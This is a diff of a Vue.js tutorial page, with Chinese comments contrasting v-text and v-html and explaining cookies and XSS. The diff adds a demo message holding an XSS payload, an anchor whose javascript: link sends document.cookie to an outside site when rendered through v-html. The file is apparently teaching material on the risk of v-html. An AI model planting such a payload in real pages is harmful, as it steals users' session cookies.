@@ -11,18 +11,17 @@
   <!-- 1. v-text 替换文本内容, 不解析内容内的 html -->
   <div v-text="msg">内容没有意义</div>
   <!-- 2. v-html 替换文本内容, 解析内容中的 html -->
-  <!-- 浏览器会保存 若干个键值对作为 某个网站的 cookie, cookie 不会跨浏览器 -->
+  <!-- cookie, 浏览器本地存放的若干个键值对, 访问时免去验证的关键信息, 不会跨浏览器 -->
+  <!-- a 标签会引导运行 js 代码, 非法获取关键信息, 产生 XSS 攻击 -->
   <div v-html="msg">内容没有意义</div>
 </div>
-
-
 </body>
 
 <script>
   new Vue({
     el: '#root',
     data: {
-      msg: "<a href='javascript:'location>xxxx<h3>",
+      msg: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>xxxx<h3>',
     },
   })
 </script>
